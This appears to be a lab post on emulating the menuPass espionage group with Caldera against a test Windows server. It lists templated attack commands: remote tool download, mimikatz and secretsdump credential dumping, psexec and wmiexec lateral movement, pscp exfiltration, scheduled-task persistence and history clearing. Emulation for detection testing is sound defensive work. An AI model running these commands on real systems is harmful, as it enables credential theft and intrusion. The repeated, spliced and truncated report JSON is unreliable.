---
title: "Adversary: menuPass"
date: 2024-11-12 18:00:00 +0900
categories: [Virtualbox, Elasticsearch, Fleet]
tags: [research, networking]     # TAG names should always 
---

## Sequence of actions

```bash
┌──(caldera-env)─(attacker㉿kali)-[~/…/caldera/plugins/emu/data]
└─$ jq '.[] | select(.adversary == "menuPass")' commands-output.json
```

```json
{
  "adversary": "menuPass",
  "abilities": [
    {
      "ability_id": "a750b196-8168-461a-8747-bdc4add107ac",
      "platform": "windows",
      "commands": {
        "psh": "Start-BitsTransfer -Source \"http://#{bitsadmin_remote_ip}/#{bitsadmin_b64_encoded_string}\" -Destination \"C:\\ProgramData\\temp\\#{bitsadmin_b64_encoded_string}\"\n"
      },
      "privilege": "Unknown",
      "tactic": "discovery",
      "technique": "Ingress Tool Transfer",
      "attack_id": "T1105"
    },
    {
      "ability_id": "7877ec4d-3c11-40f2-9650-35261e4ac879",
      "platform": "windows",
      "commands": {
        "cmd": "net use\n"
      },
      "privilege": "Unknown",
      "tactic": "discovery",
      "technique": "Network Share Discovery",
      "attack_id": "T1135"
    },
    {
      "ability_id": "e132a235-fe43-45c2-a334-2f235a7646b5",
      "platform": "windows",
      "commands": {
        "cmd": "net view /domain\n"
      },
      "privilege": "Unknown",
      "tactic": "discovery",
      "technique": "Remote System Discovery",
      "attack_id": "T1018"
    },
    {
      "ability_id": "d19678ac-3bca-475e-89d4-f452bfc2cc2a",
      "platform": "windows",
      "commands": {
        "psh": "Test-NetConnection \"#{host_address}\"\n"
      },
      "privilege": "Unknown",
      "tactic": "discovery",
      "technique": "Remote System Discovery",
      "attack_id": "T1018"
    },
    {
      "ability_id": "b6026408-c815-47ca-bbb0-6b74591badc8",
      "platform": "windows",
      "commands": {
        "cmd": "\"#{tcping_local_path}\\tcping.exe\" \"#{tcping_remote_ip}\" \"#{tcping_remote_port}\"\n"
      },
      "privilege": "Unknown",
      "tactic": "discovery",
      "technique": "Network Service Scanning",
      "attack_id": "T1046"
    },
    {
      "ability_id": "814005f7-c8d3-45c8-aea2-45758b2d6e90",
      "platform": "windows",
      "commands": {
        "cmd": "\"#{nbtscan_local_path}\\nbtscan.exe\" #{nbt_ip_range}\n"
      },
      "privilege": "Unknown",
      "tactic": "discovery",
      "technique": "System Network Configuration Discovery",
      "attack_id": "T1016"
    },
    {
      "ability_id": "9d543214-6476-429a-9ca1-cf12233b808c",
      "platform": "windows",
      "commands": {
        "cmd": "\"#{netsess_local_path}\\netsess.exe\" #{netsess_remote_ip}\n"
      },
      "privilege": "Unknown",
      "tactic": "discovery",
      "technique": "System Network Configuration Discovery",
      "attack_id": "T1016"
    },
    {
      "ability_id": "ffb50e17-cb3c-4424-a4e7-99e3885f22cc",
      "platform": "windows",
      "commands": {
        "cmd": "\"#{mimikatz_local_path}\\#{mimikatz_arch}\\mimikatz.exe\" \"#{mimikatz_module}\"\n"
      },
      "privilege": "Elevated",
      "tactic": "credential-access",
      "technique": "OS Credential Dumping: LSASS Memory",
      "attack_id": "T1003.001"
    },
    {
      "ability_id": "fe3d4de1-50bf-4241-9546-72dc757e696f",
      "platform": "windows",
      "commands": {
        "cmd": "\"#{secretsdump_local_path}\\secretsdump.exe\" \"#{secretsdump_domain}\"/\"#{secretsdump_user}\":\"#{secretsdump_pass}\"@\"#{secretsdump_remote_host}\"\n"
      },
      "privilege": "Elevated",
      "tactic": "credential-access",
      "technique": "OS Credential Dumping: Security Account Manager",
      "attack_id": "T1003.002"
    },
    {
      "ability_id": "4b1748e5-532c-453c-b195-557ce5550fef",
      "platform": "windows",
      "commands": {
        "cmd": "\"#{psexec_local_path}\\psexec.exe\" \"#{psexec_user}\":\"#{psexec_password}\"@\"#{psexec_remote_host}\" \"#{psexec_cmd}\"\n"
      },
      "privilege": "Unknown",
      "tactic": "lateral-movement",
      "technique": "System Services: Service Execution",
      "attack_id": "T1569.002"
    },
    {
      "ability_id": "160a1e0f-0f9b-49bb-a0fe-7e362b51737f",
      "platform": "windows",
      "commands": {
        "cmd": "rar.exe a \"#{rar_archive_name}\" \"#{rar_files}\"\n"
      },
      "privilege": "Unknown",
      "tactic": "collection",
      "technique": "Archive Collected Data - Archive via Utility",
      "attack_id": "T1560.001"
    },
    {
      "ability_id": "b4fa6d2e-ed9c-4a86-81aa-19331983fe0d",
      "platform": "windows",
      "commands": {
        "cmd": "copy #{copy_filename} \"C:\\$Recycle.Bin\\\"\n"
      },
      "privilege": "Unknown",
      "tactic": "collection",
      "technique": "Local Data Staging",
      "attack_id": "T1074.001"
    },
    {
      "ability_id": "ea4bc858-ba13-4f97-9df3-c543d8f3d44c",
      "platform": "windows",
      "commands": {
        "cmd": "\"#{pscp_local_path}\\pscp.exe\" \"#{pscp_exfil_files}\" \"#{pscp_user}\"@\"#{pscp_server}\":/\"#{pscp_drop_location}\"\n"
      },
      "privilege": "Unknown",
      "tactic": "exfiltration",
      "technique": "Transfer Data to Cloud Account",
      "attack_id": "T1537"
    },
    {
      "ability_id": "8911d502-747a-4155-adcd-b03a1f284ee7",
      "platform": "windows",
      "commands": {
        "cmd": "cscript.exe \"#{wmiexec_local_path}\\wmiexec.vbs\" /shell \"#{wmiexec_remote_host}\"\n"
      },
      "privilege": "Unknown",
      "tactic": "execution",
      "technique": "Windows Management Instrumentation",
      "attack_id": "T1047"
    },
    {
      "ability_id": "236d1357-64f9-4a98-afc1-bccaa89aba8c",
      "platform": "windows",
      "commands": {
        "cmd": "schtasks /create /sc \"#{schtask_schedule}\" /tn \"#{schtask_taskname}\" /tr \"#{schtask_taskrun}\" /ru \"#{schtask_username}\"\n"
      },
      "privilege": "Elevated",
      "tactic": "persistence",
      "technique": "Scheduled Task/Job: Scheduled Task",
      "attack_id": "T1553.005"
    }
  ]
}
```

## Windows Commands extracted

```powershell
Start-BitsTransfer -Source "http://#{bitsadmin_remote_ip}/#{bitsadmin_b64_encoded_string}" -Destination "C:\ProgramData\temp\#{bitsadmin_b64_encoded_string}"
net use
net view /domain
Test-NetConnection "#{host_address}"
"#{tcping_local_path}\tcping.exe" "#{tcping_remote_ip}" "#{tcping_remote_port}"
"#{nbtscan_local_path}\nbtscan.exe" #{nbt_ip_range}
"#{netsess_local_path}\netsess.exe" #{netsess_remote_ip}
"#{mimikatz_local_path}\#{mimikatz_arch}\mimikatz.exe" "#{mimikatz_module}"
"#{secretsdump_local_path}\secretsdump.exe" "#{secretsdump_domain}"/"#{secretsdump_user}":"#{secretsdump_pass}"@"#{secretsdump_remote_host}"
"#{psexec_local_path}\psexec.exe" "#{psexec_user}":"#{psexec_password}"@"#{psexec_remote_host}" "#{psexec_cmd}"
rar.exe a "#{rar_archive_name}" "#{rar_files}"
copy #{copy_filename} "C:\$Recycle.Bin\"
"#{pscp_local_path}\pscp.exe" "#{pscp_exfil_files}" "#{pscp_user}"@"#{pscp_server}":/"#{pscp_drop_location}"
cscript.exe "#{wmiexec_local_path}\wmiexec.vbs" /shell "#{wmiexec_remote_host}"
schtasks /create /sc "#{schtask_schedule}" /tn "#{schtask_taskname}" /tr "#{schtask_taskrun}" /ru "#{schtask_username}"
```


## Checking the Event Logs:

## Checking the Report

```jsond
{"name":"Test-menuPass","host_group":[{"paw":"tjsiii","sleep_min":30,"sleep_max":60,"watchdog":0,"group":"red","architecture":"amd64","platform":"windows","server":"http://192.168.2.13:8888","upstream_dest":"http://192.168.2.13:8888","username":"WINDOWS-SERVER\\Administrator","location":"C:\\Users\\Public\\caldera-read-team-agent.exe","pid":1592,"ppid":2180,"trusted":true,"executors":["proc","cmd","psh"],"privilege":"Elevated","exe_name":"caldera-read-team-agent.exe","host":"windows-server","contact":"HTTP","proxy_receivers":{},"proxy_chain":[],"origin_link_id":"","deadman_enabled":true,"available_contacts":["HTTP"],"host_ip_addrs":["192.168.1.21"],"display_name":"windows-server$WINDOWS-SERVER\\Administrator","created":"2024-11-12T08:03:33Z","last_seen":"2024-11-12T09:40:47Z","links":[{"id":"e7bb5885-5899-474a-94ed-d1a021db12f3","paw":"tjsiii","command":"Q2xlYXItSGlzdG9yeTtDbGVhcg==","plaintext_command":"Q2xlYXItSGlzdG9yeTtDbGVhcg==","status":0,"score":0,"jitter":0,"decide":"2024-11-12T08:03:33Z","pin":0,"pid":"1384","facts":[],"relationships":[],"used":[],"unique":"e7bb5885-5899-474a-94ed-d1a021db12f3","collect":"2024-11-12T08:03:33Z","finish":"2024-11-12T08:03:33Z","ability":{"ability_id":"43b3754c-def4-4699-a673-1d85648fda6a","tactic":"defense-evasion","technique_name":"Indicator Removal on Host: Clear Command History","technique_id":"T1070.003","name":"Avoid logs","description":"Stop terminal from logging history","executors":[{"name":"sh","platform":"darwin","command":"> $HOME/.bash_history && unset HISTFILE","code":null,"language":null,"build_target":null,"payloads":[],"uploads":[],"timeout":60,"parsers":[],"cleanup":[],"variations":[],"additional_info":{}},{"name":"sh","platform":"linux","command":"> $HOME/.bash_history && unset HISTFILE","code":null,"language":null,"build_target":null,"payloads":[],"uploads":[],"timeout":60,"parsers":[],"cleanup":[],"variations":[],"additional_info":{}},{"name":"psh","platform":"windows","command":"Clear-History;Clear","code":null,"language":null,"build_target":null,"payloads":[],"uploads":[],"timeout":60,"parsers":[],"cleanup":[],"variations":[],"additional_info":{}}],"requirements":[],"privilege":null,"repeatable":false,"buckets":["defense-evasion"],"additional_info":{},"access":{},"singleton":false,"plugin":"stockpile","delete_payload":true},"executor":{"name":"psh","platform":"windows","command":"Clear-History;Clear","code":null,"language":null,"build_target":null,"payloads":[],"uploads":[],"timeout":60,"parsers":[],"cleanup":[],"variations":[],"additional_info":{}},"cleanup":0,"visibility":{"score":50,"adjustments":[]},"host":"windows-server","output":"False","deadman":false,"agent_reported_time":"2024-11-12T08:03:32Z"}],"pending_contact":"HTTP"}],"start":"2024-11-12T09:07:24Z","steps":{"tjsiii":{"steps":[{"link_id":"f288566f-8b48-4948-a44f-c097af531bb9","ability_id":"7877ec4d-3c11-40f2-9650-35261e4ac879","command":"net use","plaintext_command":"net use","delegated":"2024-11-12T09:07:24Z","run":"2024-11-12T09:08:12Z","status":0,"platform":"windows","executor":"cmd","pid":6288,"description":"Display network shares","name":"Network Share Discovery","attack":{"tactic":"discovery","technique_name":"Network Share Discovery","technique_id":"T1135"},"output":{"stdout":"New connections will be remembered.There are no entries in the list.","stderr":"","exit_code":"0"},"agent_reported_time":"2024-11-12T09:08:11Z"},{"link_id":"54f82d0f-b338-4762-8e6d-36763ef1baec","ability_id":"e132a235-fe43-45c2-a334-2f235a7646b5","command":"net view /domain","plaintext_command":"net view /domain","delegated":"2024-11-12T09:08:14Z","run":"2024-11-12T09:09:01Z","status":1,"platform":"windows","executor":"cmd","pid":2848,"description":"Identify remote systems using net","name":"Remote System Discovery","attack":{"tactic":"discovery","technique_name":"Remote System Discovery","technique_id":"T1018"},"output":{"stdout":"","stderr":"System error 6118 has occurred.The list of servers for this workgroup is not currently available","exit_code":"2"},"agent_reported_time":"2024-11-12T09:08:48Z"}{"name":"Test-menuPass","host_group":[{"paw":"tjsiii","sleep_min":30,"sleep_max":60,"watchdog":0,"group":"red","architecture":"amd64","platform":"windows","server":"http://192.168.2.13:8888","upstream_dest":"http://192.168.2.13:8888","username":"WINDOWS-SERVER\\Administrator","location":"C:\\Users\\Public\\caldera-read-team-agent.exe","pid":1592,"ppid":2180,"trusted":true,"executors":["proc","cmd","psh"],"privilege":"Elevated","exe_name":"caldera-read-team-agent.exe","host":"windows-server","contact":"HTTP","proxy_receivers":{},"proxy_chain":[],"origin_link_id":"","deadman_enabled":true,"available_contacts":["HTTP"],"host_ip_addrs":["192.168.1.21"],"display_name":"windows-server$WINDOWS-SERVER\\Administrator","created":"2024-11-12T08:03:33Z","last_seen":"2024-11-12T09:40:47Z","links":[{"id":"e7bb5885-5899-474a-94ed-d1a021db12f3","paw":"tjsiii","command":"Q2xlYXItSGlzdG9yeTtDbGVhcg==","plaintext_command":"Q2xlYXItSGlzdG9yeTtDbGVhcg==","status":0,"score":0,"jitter":0,"decide":"2024-11-12T08:03:33Z","pin":0,"pid":"1384","facts":[],"relationships":[],"used":[],"unique":"e7bb5885-5899-474a-94ed-d1a021db12f3","collect":"2024-11-12T08:03:33Z","finish":"2024-11-12T08:03:33Z","ability":{"ability_id":"43b3754c-def4-4699-a673-1d85648fda6a","tactic":"defense-evasion","technique_name":"Indicator Removal on Host: Clear Command History","technique_id":"T1070.003","name":"Avoid logs","description":"Stop terminal from logging history","executors":[{"name":"sh","platform":"darwin","command":"> $HOME/.bash_history && unset HISTFILE","code":null,"language":null,"build_target":null,"payloads":[],"uploads":[],"timeout":60,"parsers":[],"cleanup":[],"variations":[],"additional_info":{}},{"name":"sh","platform":"linux","command":"> $HOME/.bash_history && unset HISTFILE","code":null,"language":null,"build_target":null,"payloads":[],"uploads":[],"timeout":60,"parsers":[],"cleanup":[],"variations":[],"additional_info":{}},{"name":"psh","platform":"windows","command":"Clear-History;Clear","code":null,"language":null,"build_target":null,"payloads":[],"uploads":[],"timeout":60,"parsers":[],"cleanup":[],"variations":[],"additional_info":{}}],"requirements":[],"privilege":null,"repeatable":false,"buckets":["defense-evasion"],"additional_info":{},"access":{},"singleton":false,"plugin":"stockpile","delete_payload":true},"executor":{"name":"psh","platform":"windows","command":"Clear-History;Clear","code":null,"language":null,"build_target":null,"payloads":[],"uploads":[],"timeout":60,"parsers":[],"cleanup":[],"variations":[],"additional_info":{}},"cleanup":0,"visibility":{"score":50,"adjustments":[]},"host":"windows-server","output":"False","deadman":false,"agent_reported_time":"2024-11-12T08:03:32Z"}],"pending_contact":"HTTP"}],"start":"2024-11-12T09:07:24Z","steps":{"tjsiii":{"steps":[{"link_id":"f288566f-8b48-4948-a44f-c097af531bb9","ability_id":"7877ec4d-3c11-40f2-9650-35261e4ac879","command":"net use","plaintext_command":"net use","delegated":"2024-11-12T09:07:24Z","run":"2024-11-12T09:08:12Z","status":0,"platform":"windows","executor":"cmd","pid":6288,"description":"Display network shares","name":"Network Share Discovery","attack":{"tactic":"discovery","technique_name":"Network Share Discovery","technique_id":"T1135"},"output":{"stdout":"New connections will be remembered.There are no entries in the list.","stderr":"","exit_code":"0"},"agent_reported_time":"2024-11-12T09:08:11Z"},{"link_id":"54f82d0f-b338-4762-8e6d-36763ef1baec","ability_id":"e132a235-fe43-45c2-a334-2f235a7646b5","command":"net view /domain","plaintext_command":"net view /domain","delegated":"2024-11-12T09:08:14Z","run":"2024-11-12T09:09:01Z","status":1,"platform":"windows","executor":"cmd","pid":2848,"description":"Identify remote systems using net","name":"Remote System Discovery","attack":{"tactic":"discovery","technique_name":"Remote System Discovery","technique_id":"T1018"},"output":{"stdout":"","stderr":"System error 6118 has occurred.The list of servers for this workgroup is not currently available","exit_code":"2"},"agent_reported_time":"2024-11-12T09:08:48Z"}]}},"finish":"2024-11-12T09:40:35Z","planner":"atomic","adversary":{"adversary_id":"b5192070-dff1-4134-bf66-c6b87c7498af","name":"menuPass","description":"menuPass is thought to be a Chinese cyber espionage group associated with activity directed by elements of the PRC MSS. (Emu)","atomic_ordering":["a750b196-8168-461a-8747-bdc4add107ac","7877ec4d-3c11-40f2-9650-35261e4ac879","e132a235-fe43-45c2-a334-2f235a7646b5","d19678ac-3bca-475e-89d4-f452bfc2cc2a","b6026408-c815-47ca-bbb0-6b74591badc8","814005f7-c8d3-45c8-aea2-45758b2d6e90","9d543214-6476-429a-9ca1-cf12233b808c","ffb50e17-cb3c-4424-a4e7-99e3885f22cc","fe3d4de1-50bf-4241-9546-72dc757e696f","4b1748e5-532c-453c-b195-557ce5550fef","160a1e0f-0f9b-49bb-a0fe-7e362b51737f","b4fa6d2e-ed9c-4a86-81aa-19331983fe0d","ea4bc858-ba13-4f97-9df3-c543d8f3d44c","8911d502-747a-4155-adcd-b03a1f284ee7","236d1357-64f9-4a98-afc1-bccaa89aba8c"],"objective":"495a9828-cab1-44dd-a0ca-66e58177d8cc","tags":[],"has_repeatable_abilities":false,"plugin":"emu"},"jitter":"2/8","objectives":{"id":"495a9828-cab1-44dd-a0ca-66e58177d8cc","name":"default","description":"This is a default objective that runs forever.","goals":[{"target":"exhaustion","value":"complete","count":1048576,"operator":"==","achieved":false}],"percentage":0},"facts":[{"unique":"file.sensitive.extensionwav","trait":"file.sensitive.extension","name":"file.sensitive.extension","value":"wav","created":"2024-11-09T07:37:21Z","score":1,"source":"ed32b9c3-9593-4c33-b0db-e2007315096b","origin_type":"IMPORTED","links":[],"relationships":[],"limit_count":-1,"collected_by":[],"technique_id":""},{"unique":"file.sensitive.extensionyml","trait":"file.sensitive.extension","name":"file.sensitive.extension","value":"yml","created":"2024-11-09T07:37:21Z","score":1,"source":"ed32b9c3-9593-4c33-b0db-e2007315096b","origin_type":"IMPORTED","links":[],"relationships":[],"limit_count":-1,"collected_by":[],"technique_id":""},{"unique":"file.sensitive.extensionpng","trait":"file.sensitive.extension","name":"file.sensitive.extension","value":"png","created":"2024-11-09T07:37:21Z","score":1,"source":"ed32b9c3-9593-4c33-b0db-e2007315096b","origin_type":"IMPORTED","links":[],"relationships":[],"limit_count":-1,"collected_by":[],"technique_id":""},{"unique":"server.malicious.urlkeyloggedsite.com","trait":"server.malicious.url","name":"server.malicious.url","value":"keyloggedsite.com","created":"2024-11-09T07:37:21Z","score":1,"source":"ed32b9c3-9593-4c33-b0db-e2007315096b","origin_type":"IMPORTED","links":[],"relationships":[],"limit_count":-1,"collected_by":[],"technique_id":""}],"skipped_abilities":[{"tjsiii":[{"reason":"Fact dependency not fulfilled","reason_id":3,"ability_id":"a750b196-8168-461a-8747-bdc4add107ac","ability_name":"Ingress Tool Transfer"},{"reason":"Fact dependency not fulfilled","reason_id":3,"ability_id":"d19678ac-3bca-475e-89d4-f452bfc2cc2a","ability_name":"Remote System Discovery"},{"reason":"Fact dependency not fulfilled","reason_id":3,"ability_id":"b6026408-c815-47ca-bbb0-6b74591badc8","ability_name":"Network Service Scanning"},{"reason":"Fact dependency not fulfilled","reason_id":3,"ability_id":"814005f7-c8d3-45c8-aea2-45758b2d6e90","ability_name":"System Network Configuration Discovery"},{"reason":"Fact dependency not fulfilled","reason_id":3,"ability_id":"9d543214-6476-429a-9ca1-cf12233b808c","ability_name":"System Network Configuration Discovery"},{"reason":"Fact dependency not fulfilled","reason_id":3,"ability_id":"ffb50e17-cb3c-4424-a4e7-99e3885f22cc","ability_name":"OS Credential Dumping"},{"reason":"Fact dependency not fulfilled","reason_id":3,"ability_id":"fe3d4de1-50bf-4241-9546-72dc757e696f","ability_name":"OS Credential Dumping"},{"reason":"Fact dependency not fulfilled","reason_id":3,"ability_id":"4b1748e5-532c-453c-b195-557ce5550fef","ability_name":"Service Execution"},{"reason":"Fact dependency not fulfilled","reason_id":3,"ability_id":"160a1e0f-0f9b-49bb-a0fe-7e362b51737f","ability_name":"Archive Collected Data - Archive via Utility"},{"reason":"Fact dependency not fulfilled","reason_id":3,"ability_id":"b4{"name":"Test-menuPass","host_group":[{"paw":"tjsiii","sleep_min":30,"sleep_max":60,"watchdog":0,"group":"red","architecture":"amd64","platform":"windows","server":"http://192.168.2.13:8888","upstream_dest":"http://192.168.2.13:8888","username":"WINDOWS-SERVER\\Administrator","location":"C:\\Users\\Public\\caldera-read-team-agent.exe","pid":1592,"ppid":2180,"trusted":true,"executors":["proc","cmd","psh"],"privilege":"Elevated","exe_name":"caldera-read-team-agent.exe","host":"windows-server","contact":"HTTP","proxy_receivers":{},"proxy_chain":[],"origin_link_id":"","deadman_enabled":true,"available_contacts":["HTTP"],"host_ip_addrs":["192.168.1.21"],"display_name":"windows-server$WINDOWS-SERVER\\Administrator","created":"2024-11-12T08:03:33Z","last_seen":"2024-11-12T09:40:47Z","links":[{"id":"e7bb5885-5899-474a-94ed-d1a021db12f3","paw":"tjsiii","command":"Q2xlYXItSGlzdG9yeTtDbGVhcg==","plaintext_command":"Q2xlYXItSGlzdG9yeTtDbGVhcg==","status":0,"score":0,"jitter":0,"decide":"2024-11-12T08:03:33Z","pin":0,"pid":"1384","facts":[],"relationships":[],"used":[],"unique":"e7bb5885-5899-474a-94ed-d1a021db12f3","collect":"2024-11-12T08:03:33Z","finish":"2024-11-12T08:03:33Z","ability":{"ability_id":"43b3754c-def4-4699-a673-1d85648fda6a","tactic":"defense-evasion","technique_name":"Indicator Removal on Host: Clear Command History","technique_id":"T1070.003","name":"Avoid logs","description":"Stop terminal from logging history","executors":[{"name":"sh","platform":"darwin","command":"> $HOME/.bash_history && unset HISTFILE","code":null,"language":null,"build_target":null,"payloads":[],"uploads":[],"timeout":60,"parsers":[],"cleanup":[],"variations":[],"additional_info":{}},{"name":"sh","platform":"linux","command":"> $HOME/.bash_history && unset HISTFILE","code":null,"language":null,"build_target":null,"payloads":[],"uploads":[],"timeout":60,"parsers":[],"cleanup":[],"variations":[],"additional_info":{}},{"name":"psh","platform":"windows","command":"Clear-History;Clear","code":null,"language":null,"build_target":null,"payloads":[],"uploads":[],"timeout":60,"parsers":[],"cleanup":[],"variations":[],"additional_info":{}}],"requirements":[],"privilege":null,"repeatable":false,"buckets":["defense-evasion"],"additional_info":{},"access":{},"singleton":false,"plugin":"stockpile","delete_payload":true},"executor":{"name":"psh","platform":"windows","command":"Clear-History;Clear","code":null,"language":null,"build_target":null,"payloads":[],"uploads":[],"timeout":60,"parsers":[],"cleanup":[],"variations":[],"additional_info":{}},"cleanup":0,"visibility":{"score":50,"adjustments":[]},"host":"windows-server","output":"False","deadman":false,"agent_reported_time":"2024-11-12T08:03:32Z"}],"pending_contact":"HTTP"}],"start":"2024-11-12T09:07:24Z","steps":{"tjsiii":{"steps":[{"link_id":"f288566f-8b48-4948-a44f-c097af531bb9","ability_id":"7877ec4d-3c11-40f2-9650-35261e4ac879","command":"net use","plaintext_command":"net use","delegated":"2024-11-12T09:07:24Z","run":"2024-11-12T09:08:12Z","status":0,"platform":"windows","executor":"cmd","pid":6288,"description":"Display network shares","name":"Network Share Discovery","attack":{"tactic":"discovery","technique_name":"Network Share Discovery","technique_id":"T1135"},"output":{"stdout":"New connections will be remembered.There are no entries in the list.","stderr":"","exit_code":"0"},"agent_reported_time":"2024-11-12T09:08:11Z"},{"link_id":"54f82d0f-b338-4762-8e6d-36763ef1baec","ability_id":"e132a235-fe43-45c2-a334-2f235a7646b5","command":"net view /domain","plaintext_command":"net view /domain","delegated":"2024-11-12T09:08:14Z","run":"2024-11-12T09:09:01Z","status":1,"platform":"windows","executor":"cmd","pid":2848,"description":"Identify remote systems using net","name":"Remote System Discovery","attack":{"tactic":"discovery","technique_name":"Remote System Discovery","technique_id":"T1018"},"output":{"stdout":"","stderr":"System error 6118 has occurred.The list of servers for this workgroup is not currently available","exit_code":"2"},"agent_reported_time":"2024-11-12T09:08:48Z"}]}},"finish":"2024-11-12T09:40:35Z","planner":"atomic","adversary":{"adversary_id":"b5192070-dff1-4134-bf66-c6b87c7498af","name":"menuPass","description":"menuPass is thought to be a Chinese cyber espionage group associated with activity directed by elements of the PRC MSS. (Emu)","atomic_ordering":["a750b196-8168-461a-8747-bdc4add107ac","7877ec4d-3c11-40f2-9650-35261e4ac879","e132a235-fe43-45c2-a334-2f235a7646b5","d19678ac-3bca-475e-89d4-f452bfc2cc2a","b6026408-c815-47ca-bbb0-6b74591badc8","814005f7-c8d3-45c8-aea2-45758b2d6e90","9d543214-6476-429a-9ca1-cf12233b808c","ffb50e17-cb3c-4424-a4e7-99e3885f22cc","fe3d4de1-50bf-4241-9546-72dc757e696f","4b1748e5-532c-453c-b195-557ce5550fef","160a1e0f-0f9b-49bb-a0fe-7e362b51737f","b4fa6d2e-ed9c-4a86-81aa-19331983fe0d","ea4bc858-ba13-4f97-9df3-c543d8f3d44c","8911d502-747a-4155-adcd-b03a1f284ee7","236d1357-64f9-4a98-afc1-bccaa89aba8c"],"objective":"495a9828-cab1-44dd-a0ca-66e58177d8cc","tags":[],"has_repeatable_abilities":false,"plugin":"emu"},"jitter":"2/8","objectives":{"id":"495a9828-cab1-44dd-a0ca-66e58177d8cc","name":"default","description":"This is a default objective that runs forever.","goals":[{"target":"exhaustion","value":"complete","count":1048576,"operator":"==","achieved":false}],"percentage":0},"facts":[{"unique":"file.sensitive.extensionwav","trait":"file.sensitive.extension","name":"file.sensitive.extension","value":"wav","created":"2024-11-09T07:37:21Z","score":1,"source":"ed32b9c3-9593-4c33-b0db-e2007315096b","origin_type":"IMPORTED","links":[],"relationships":[],"limit_count":-1,"collected_by":[],"technique_id":""},{"unique":"file.sensitive.extensionyml","trait":"file.sensitive.extension","name":"file.sensitive.extension","value":"yml","created":"2024-11-09T07:37:21Z","score":1,"source":"ed32b9c3-9593-4c33-b0db-e2007315096b","origin_type":"IMPORTED","links":[],"relationships":[],"limit_count":-1,"collected_by":[],"technique_id":""},{"unique":"file.sensitive.extensionpng","trait":"file.sensitive.extension","name":"file.sensitive.extension","value":"png","created":"2024-11-09T07:37:21Z","score":1,"source":"ed32b9c3-9593-4c33-b0db-e2007315096b","origin_type":"IMPORTED","links":[],"relationships":[],"limit_count":-1,"collected_by":[],"technique_id":""},{"unique":"server.malicious.urlkeyloggedsite.com","trait":"server.malicious.url","name":"server.malicious.url","value":"keyloggedsite.com","created":"2024-11-09T07:37:21Z","score":1,"source":"ed32b9c3-9593-4c33-b0db-e2007315096b","origin_type":"IMPORTED","links":[],"relationships":[],"limit_count":-1,"collected_by":[],"technique_id":""}],"skipped_abilities":[{"tjsiii":[{"reason":"Fact dependency not fulfilled","reason_id":3,"ability_id":"a750b196-8168-461a-8747-bdc4add107ac","ability_name":"Ingress Tool Transfer"},{"reason":"Fact dependency not fulfilled","reason_id":3,"ability_id":"d19678ac-3bca-475e-89d4-f452bfc2cc2a","ability_name":"Remote System Discovery"},{"reason":"Fact dependency not fulfilled","reason_id":3,"ability_id":"b6026408-c815-47ca-bbb0-6b74591badc8","ability_name":"Network Service Scanning"},{"reason":"Fact dependency not fulfilled","reason_id":3,"ability_id":"814005f7-c8d3-45c8-aea2-45758b2d6e90","ability_name":"System Network Configuration Discovery"},{"reason":"Fact dependency not fulfilled","reason_id":3,"ability_id":"9d543214-6476-429a-9ca1-cf12233b808c","ability_name":"System Network Configuration Discovery"},{"reason":"Fact dependency not fulfilled","reason_id":3,"ability_id":"ffb50e17-cb3c-4424-a4e7-99e3885f22cc","ability_name":"OS Credential Dumping"},{"reason":"Fact dependency not fulfilled","reason_id":3,"ability_id":"fe3d4de1-50bf-4241-9546-72dc757e696f","ability_name":"OS Credential Dumping"},{"reason":"Fact dependency not fulfilled","reason_id":3,"ability_id":"4b1748e5-532c-453c-b195-557ce5550fef","ability_name":"Service Execution"},{"reason":"Fact dependency not fulfilled","reason_id":3,"ability_id":"160a1e0f-0f9b-49bb-a0fe-7e362b51737f","ability_name":"Archive Collected Data - Archive via Utility"},{"reason":"Fact dependency not fulfilled","reason_id":3,"ability_id":"b4fa6d2e-ed9c-4a86-81aa-19331983fe0d","ability_name":"Recycle Bin Staging"},{"reason":"Fact dependency not fulfilled","reason_id":3,"ability_id":"ea4bc858-ba13-4f97-9df3-c543d8f3d44c","ability_name":"Transfer Data to Cloud Account"},{"reason":"Fact dependency not fulfilled","reason_id":3,"ability_id":"8911d502-747a-4155-adcd-b03a1f284ee7","ability_name":"Windows Management Instrumentation"},{"reason":"Fact dependency not fulfilled","reason_id":3,"ability_id":"236d1357-64f9-4a98-afc1-bccaa89aba8c","ability_name":"Scheduled Task Persistence"}]}]}
```

```json
{
   "name":"Test-menuPass",
   "host_group":[
      {
         "paw":"tjsiii",
         "sleep_min":30,
         "sleep_max":60,
         "watchdog":0,
         "group":"red",
         "architecture":"amd64",
         "platform":"windows",
         "server":"http://192.168.2.13:8888",
         "upstream_dest":"http://192.168.2.13:8888",
         "username":"WINDOWS-SERVER\\Administrator",
         "location":"C:\\Users\\Public\\caldera-read-team-agent.exe",
         "pid":1592,
         "ppid":2180,
         "trusted":true,
         "executors":[
            "proc",
            "cmd",
            "psh"
         ],
         "privilege":"Elevated",
         "exe_name":"caldera-read-team-agent.exe",
         "host":"windows-server",
         "contact":"HTTP",
         "proxy_receivers":{
            
         },
         "proxy_chain":[
            
         ],
         "origin_link_id":"",
         "deadman_enabled":true,
         "available_contacts":[
            "HTTP"
         ],
         "host_ip_addrs":[
            "192.168.1.21"
         ],
         "display_name":"windows-server$WINDOWS-SERVER\\Administrator",
         "created":"2024-11-12T08:03:33Z",
         "last_seen":"2024-11-12T09:40:47Z",
         "links":[
            {
               "id":"e7bb5885-5899-474a-94ed-d1a021db12f3",
               "paw":"tjsiii",
               "command":"Q2xlYXItSGlzdG9yeTtDbGVhcg==",
               "plaintext_command":"Q2xlYXItSGlzdG9yeTtDbGVhcg==",
               "status":0,
               "score":0,
               "jitter":0,
               "decide":"2024-11-12T08:03:33Z",
               "pin":0,
               "pid":"1384",
               "facts":[
                  
               ],
               "relationships":[
                  
               ],
               "used":[
                  
               ],
               "unique":"e7bb5885-5899-474a-94ed-d1a021db12f3",
               "collect":"2024-11-12T08:03:33Z",
               "finish":"2024-11-12T08:03:33Z",
               "ability":{
                  "ability_id":"43b3754c-def4-4699-a673-1d85648fda6a",
                  "tactic":"defense-evasion",
                  "technique_name":"Indicator Removal on Host: Clear Command History",
                  "technique_id":"T1070.003",
                  "name":"Avoid logs",
                  "description":"Stop terminal from logging history",
                  "executors":[
                     {
                        "name":"sh",
                        "platform":"darwin",
                        "command":"> $HOME/.bash_history && unset HISTFILE",
                        "code":null,
                        "language":null,
                        "build_target":null,
                        "payloads":[
                           
                        ],
                        "uploads":[
                           
                        ],
                        "timeout":60,
                        "parsers":[
                           
                        ],
                        "cleanup":[
                           
                        ],
                        "variations":[
                           
                        ],
                        "additional_info":{
                           
                        }
                     },
                     {
